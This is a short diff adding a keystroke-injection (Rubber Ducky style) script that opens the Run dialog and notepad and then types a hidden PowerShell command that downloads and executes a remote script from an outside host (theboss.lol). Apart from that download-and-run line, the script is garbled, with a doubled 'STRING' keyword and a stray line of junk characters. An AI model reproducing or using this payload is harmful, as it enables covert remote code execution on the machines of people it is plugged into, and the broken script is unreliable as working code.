@@ -1,0 +1,12 @@
+
+GUI r
+DELAY 1000
+STRING notepad
+DELAY 1000
+ENTER
+DELAY 1000
+STRING notepad
+STRING )( ".'
+DELAY 1000
+ENTER
+STRING STRING powershell -w hidden "IEX (New-Object Net.WebClient).DownloadString('http://theboss.lol/payload.ps1');"
